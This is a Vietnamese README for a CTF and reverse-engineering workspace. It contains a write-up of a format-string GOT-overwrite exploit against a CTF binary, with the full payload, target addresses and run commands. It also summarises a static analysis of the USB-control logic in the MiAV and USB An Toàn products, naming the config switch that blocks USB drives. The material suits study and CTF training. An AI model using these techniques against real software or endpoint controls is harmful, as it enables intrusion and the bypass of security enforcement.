# got_overwrite — CTF Dong Nai 2026

## Case hiện tại: MiAV 4.1.1.2 & USB An Toàn 2.6 (BTL86) — cơ chế quản lý USB

> Workspace dùng chung cho nhiều case. Phân tích mới nhất nằm ở [`report/report.md`](report/report.md).

| Mục | Giá trị |
|---|---|
| Loại | Phân tích tĩnh 2 installer Inno Setup (read-only, không thực thi) |
| MiAV 4.1.1.2 | Delphi x86-32 · engine quyết định `@ 0x90ECE0` · khoá bằng minifilter CBFS Filter 2020 |
| USB An Toàn 2.6 | `USB_ATTT.exe` (VB6 native) · format + label `USB-AT2.6` + bộ file chỉ dấu + ACL |
| Kết luận | MiAV là bên **kiểm tra & cưỡng chế**, USB An Toàn là bên **sinh dấu vết**; `config.ini [Drive] usb_no_at = block` là công tắc khóa |

| File | Mô tả |
|---|---|
| `report/report.md` | Báo cáo cơ chế đầy đủ (tiếng Việt) |
| `report/diagrams/*.svg\|pdf\|png` | 5 sơ đồ kiến trúc / luồng quyết định / trạng thái / offset map |
| `evidence/E-001.md` | Định danh, hash, Inno Setup script, layout |
| `evidence/E-002.md` | MiAV: engine quyết định USB, phân loại, khoá kernel, cảnh báo, syslog |
| `evidence/E-004.md` | USB_ATTT.exe: API, quy trình tạo USB, ACL, đối chiếu với MiAV |
| `scope.md`, `workitems.md`, `timeline.md` | Hồ sơ case (pass `review_case.py --strict`) |
| `work/*.py` | Script PE/Delphi/disasm/string/diagram tự viết |

---

## Case trước: CTF pwn GOT overwrite

## Kết quả

| Mục | Giá trị |
|-----|---------|
| Loại | CTF pwn (GOT overwrite) |
| Độ khó | Khó (so với bài Trung bình chỉ lật 1 cờ bool) |
| Binary | `got_overwrite` — ELF 64-bit Linux, no PIE, no RELRO, NX on |
| Hidden func | `thong_bao_bi_mat` @ `0x401216` |
| Target GOT  | `got.strlen` @ `0x403410` |
| Payload     | `%4198934c%8$llna\x10\x34\x40\x00\x00\x00\x00\x00` (24 bytes) |
| Format string offset | **6** (xác nhận bằng Unicorn emulation) |

## Tóm tắt kỹ thuật

`main()` đọc input vào `buf[256]` rồi gọi `printf(buf)` — **format string
vulnerability** cổ điển. Sau đó main gọi `xu_ly_du_lieu(buf)`, hàm này
gọi `strlen(buf)`. Trong binary có một hàm ẩn `thong_bao_bi_mat` đọc
`flag.txt` và in nội dung — hàm này không bao giờ được gọi trong luồng
bình thường.

Vì binary **không PIE** và **không RELRO**, GOT là vùng nhớ tĩnh (0x403xxx)
và có quyền ghi. Payload format string ghi địa chỉ `0x401216` (hàm ẩn)
vào `0x403410` (GOT entry của `strlen`). Lần gọi `strlen` tiếp theo
sẽ nhảy sang hàm ẩn và in flag.

## Các file

| File | Mô tả |
|------|-------|
| `got_overwrite` | Binary gốc (Linux ELF 64-bit) |
| `got_overwrite.bak` | Backup |
| `exploit.py` | Exploit pwntools chính (payload + runner) |
| `inspect_elf.py` | Recon: checksec, symbols, GOT, PLT |
| `disasm2.py` | Disassembly main / xu_ly_du_lieu / thong_bao_bi_mat bằng Capstone |
| `rodata.py` | Dump rodata strings |
| `verify_offset5.py` | **Quan trọng**: xác minh offset=6 bằng Unicorn emulation |
| `work/scope.md` | Scope / authorization |
| `evidence/E-001.md` | Evidence: phân tích tĩnh |
| `evidence/E-002.md` | Evidence: format string offset = 6 (Unicorn) |
| `evidence/E-003.md` | Evidence: payload build |
| `report/report.md` | Báo cáo cuối |

## Cách chạy exploit

Trên máy **Linux** (binary Linux ELF không chạy được trên Windows):

```bash
# Local test với flag.txt giả
echo "CTF{test}" > flag.txt
python3 exploit.py

# Remote (nếu có server)
HOST=ctf.example.com PORT=1337 python3 exploit.py REMOTE
```

Kỳ vọng output: khoảng 4 MB khoảng trắng (từ `%4198934c`) + dòng
`>>> HE THONG DA BI CHIEM QUYEN: <flag content>`.

## Tại sao offset=6?

Trong x86-64 SysV ABI, variadic args 1-5 của printf nằm trong
`rsi, rdx, rcx, r8, r9`. Từ arg thứ 6 trở đi, giá trị được đọc từ
stack của caller, bắt đầu từ `[rsp_tại_call_site + 0]`.

Trong `main`:
- `sub rsp, 0x100` → `rsp = rbp - 0x100`
- `buf` nằm ở `rbp - 0x100`
- Tại lệnh `call printf`: `rsp = rbp - 0x100 = &buf`
- Vậy stack variadic arg 6 = `[rsp + 0] tại call` = `buf[0..7]`

Xác minh bằng `verify_offset5.py` (Unicorn): đặt marker `AAAA` tại
`buf[0..7]`, thay thế printf bằng stub đọc 15 variadic positions.
Stub đọc được `AAAA%6$p` ở **position 6** → offset = 6. ✓

## Tại sao `%lln`?

- `got.strlen` lưu trữ 64-bit pointer (địa chỉ libc của `strlen`)
- Cần ghi toàn bộ 8 byte = 0x0000000000401216
- `%lln` ghi 64-bit (8 byte) — ghi đúng 1 lần, đơn giản nhất
- `%n` (32-bit) cũng được, nhưng chỉ ghi được 4 byte thấp; byte cao
  của GOT entry (0x00007fxx...) sẽ vẫn còn → gọi `strlen` sẽ crash
- `%hn` / `%hhn` cần nhiều lần ghi và phức tạp hơn

## Tại sao `%4198934c`?

- Giá trị cần ghi: 0x401216 = 4,198,934 (decimal)
- `%Nc` yêu cầu printf in N ký tự (padding) → counter của `%n`/%`lln`
  tăng lên N
- Sau `%4198934c`, counter = 4,198,934 = 0x401216
- `%8$lln` ghi counter này (8 bytes) vào địa chỉ ở position 8

## Các lệnh kiểm tra đã chạy

```
$ python inspect_elf.py
  Arch: amd64
  RELRO: No RELRO
  Stack: No canary found
  NX: NX enabled
  PIE:  No PIE (0x400000)
  GOT[strlen] = 0x403410
  thong_bao_bi_mat = 0x401216

$ python verify_offset5.py
  pos  6 (stack[+0]): 0x7024362541414141
  >>> AAAA%6$p at position 6  -> offset = 6 confirmed

$ python exploit.py
  [+] payload length = 24 bytes
  [+] payload hex    = 2534313938393334632538246c6c6e611034400000000000
```
